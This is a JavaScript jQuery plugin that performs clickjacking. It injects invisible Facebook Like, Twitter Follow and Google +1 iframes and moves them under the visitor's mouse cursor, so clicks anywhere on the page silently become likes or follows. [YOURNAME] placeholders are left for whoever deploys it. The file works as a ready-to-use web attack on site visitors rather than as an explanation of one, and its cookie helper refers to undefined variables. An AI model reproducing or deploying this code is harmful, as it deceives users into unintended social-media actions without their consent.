
(function ($) { 
    
   // test for IE 
   var IE = false;
    if ($('html').is('.ie6, .ie7, .ie8')) {
        IE = true;
    }
    
    var like; 
    var _this = this;

        

        function startFacebook()
        {
 
             $.noConflict();
            var interval;
            var iflag;
            var icontainer;
            var standardbody;
            
         console.log ("facebook running"); 
         
          var tempX = 0,
          tempY = 0;
             
            
           like = document.createElement('iframe');
           like.src = 'http://www.facebook.com/plugins/like.php?href=' + encodeURIComponent("http://www.facebook.com/pages/[YOURNAME]") + '&amp;layout=compact&amp;show_faces=false&amp;width=53&amp;action=like&amp;colorscheme=light&amp;height=80';
           like.scrolling = 'no';
           like.frameBorder = 0;
           like.allowTransparency = 'true';
           like.style.border = 2;
           like.style.overflow = 'hidden';
           like.style.cursor = 'pointer';
           like.style.width = '53px';
           like.style.height =  '23px';
           like.style.position = 'absolute';
           like.style.opacity = 0; // Change to 0 to hide or 1 to show
           document.getElementsByTagName('body')[0].appendChild(like);
          
           _this.addEventListener('mousemove', mouseMove, false);
          
          /* ** Uncomment to set timer 
        
          setTimeout(function(){
            document.getElementsByTagName('body')[0].removeChild(like);
            window.removeEventListener('mousemove', mouseMove, false);
          }, 10000);
          */
        };
        
        $.startFacebook = startFacebook; 

        function startTwitter()
        {
            $.noConflict();
            var interval;
            var iflag;
            var icontainer;
            var standardbody;
            
            jQuery(function(){
                jQuery("body").append('<div style="overflow: hidden;width: 10px;height: 12px;position:absolute;filter:alpha(opacity=0);-moz-opacity:0;-khtml-opacity:0;opacity:0;" id="twitterContainer"><iframe src="http://platform.twitter.com/widgets/follow_button.html?screen_name=[YOURNAME]&show_count=false" scrolling="no" frameborder="0"  style="border:none;overflow:hidden;width:50px;height:23px;" allowTransparency="true" id="twitter_frame" name="twitter_frame"></iframe></div>');
                iflag = 0;
                icontainer = document.getElementById('twitterContainer');
                standardbody = (document.compatMode=="CSS1Compat") ? document.documentElement : document.body //create reference to common "body" across doctypescheckCookie();
               // interval=setInterval("updateActiveElement();", 50);
                }
            );
            
            jQuery("html").bind('mousemove', function(e){
                if (iflag == 0 ) {
                    var x = e.pageX - 5;
                    var y = e.pageY;
                    //console.log("X: " + x + " AND Y: " + y);
                    jQuery(icontainer).css('top', y).css('left', x);
                    }
                }
            );
        };
        
         $.startTwitter = startTwitter;
        
        function startGoogle() {
            
            $.noConflict();
//            var interval;
            var iflag;
//            var icontainer;
            var standardbody;
            
            //alert("starting GOOGLE"); 
            //console.log("google running"); 
            

            
            jQuery(function(){
                jQuery('.gc-reset').css({"opacity": "0"});
                iflag = 0;
                standardbody = (document.compatMode=="CSS1Compat") ? document.documentElement : document.body; //create reference to common "body" across doctypescheckCookie();
                }
            );
                


           jQuery("html").bind('mousemove', function(e){
                if (iflag == 0 ) {
                    var x = e.pageX + 28;
                    var y = e.pageY - 17;
                    //console.log("X: " + x + " AND Y: " + y);
                     $( '#googleWrapper').css('top', y).css('left', x);
                    }
                }
            );
            
        };       
        $.startGoogle = startGoogle; 
        
        
        
        function mouseMove(e) {
            if (IE) {
              tempX = event.clientX + document.body.scrollLeft;
              tempY = event.clientY + document.body.scrollTop;
            } else {
              tempX = e.pageX;
              tempY = e.pageY;
            }
            
            if (tempX < 0) tempX = 0;
            if (tempY < 0) tempY = 0;
            
            like.style.top = (tempY - 8) + 'px';
            like.style.left = (tempX - 25) + 'px';
            
            return true;
         };
        
        
        function getCookie(c_name){
            var i,x,y,ARRcookies=document.cookie.split(";");
        
            for (i=0; i<ARRcookies.length; i++) {
                x=ARRcookies[i].substr(0,ARRcookies[i].indexOf("="));
                y=ARRcookies[i].substr(ARRcookies[i].indexOf("=")+1);
                x=x.replace(/^\s+|\s+$/g,"");
        
                if (x==c_name) {
                    //console.log(unescape(y) );
                    return unescape(y);
                }
            }
        };
        

        function setCookie(name,value,expires){
            if (exdays) {
              var date = new Date();
              date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
              var expires = "; expires=" + date.toGMTString();
             } 
             else var expires = "";
              
             document.cookie = escape(name) + "=" + escape(value) + expires + "; path=/";
              
        };
        

}(jQuery));

 

        
